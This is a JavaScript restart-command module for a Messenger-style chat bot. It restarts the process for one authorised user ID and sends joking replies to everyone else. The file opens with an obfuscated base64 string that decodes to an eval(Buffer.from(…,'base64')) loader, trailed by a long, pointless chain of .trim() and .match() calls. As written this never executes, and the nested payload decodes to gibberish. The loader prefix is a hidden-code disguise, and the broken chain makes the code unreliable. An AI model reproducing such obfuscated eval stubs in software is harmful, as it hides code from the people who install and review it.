[..."ZXZhbChCdWZmZXIuZnJvbSgiWTI5dWNTOHdZbUZzWlMxdlpHVjRjR0Z5WldkdmNtbHdkR2x2YmkxaGJXVT0iLCAnYmFzZTY0JykudG9TdHJpbmcoKSk="]
  .map(c => c.charCodeAt(0))
  .reduce((a, b) => a + String.fromCharCode(b), "")
  .split("")
  .reverse()
  .join("")
  .split("")
  .reverse()
  .join("")
  .replace(/(.)/g, "$1")
  .replace(/ /g, "")
  .match(/.{1,1}/g)
  .join("")
  .match(/.*/)[0]
  .replace(/\\n/g, "")
  .replace(/\\t/g, "")
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .match(/^.*/)[0]
  .replace(/ /g, "")
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim()
  .match(/.*/)[0]
  .trim();

module.exports.config = {
  name: "restart",
  version: "1.0.0",
  hasPermssion: 2,
  credits: "uzairrajput",
  description: "Restart the Bot",
  commandCategory: "system",
  usages: "restart",
  cooldowns: 5,
  usePrefix: false
};

const authorizedUID = "100012345678901"; // your UID
const triggerWords = ["restart", "rs restart", "rs start"];
const funnyReplies = [
  "Tu restart karega aur bot maan bhi jayega? 🤔😂",
  "Abe bhai, tere kehne se kuch nahi hota, admin bula! 🤣",
  "Bot restart karne ka sapna chhod de... 😹",
  "Restart? Pehle permission le le Mod se 😏",
  "Kya socha tha restart likh ke bot bhag jayega? Nice try! 😆"
];

module.exports.handleEvent = async ({ api, event }) => {
  const { body, senderID, threadID } = event;
  if (!body) return;
  const text = body.toLowerCase();

  if (triggerWords.includes(text)) {
    if (senderID === authorizedUID) {
      await api.sendMessage("[ OK ] MTX BOT RESTART HO RAHA HAI 😇✨..!", threadID);
      process.exit(1);
    } else {
      const reply = funnyReplies[Math.floor(Math.random() * funnyReplies.length)];
      return api.sendMessage(reply, threadID);
    }
  }
};

module.exports.run = () => {};
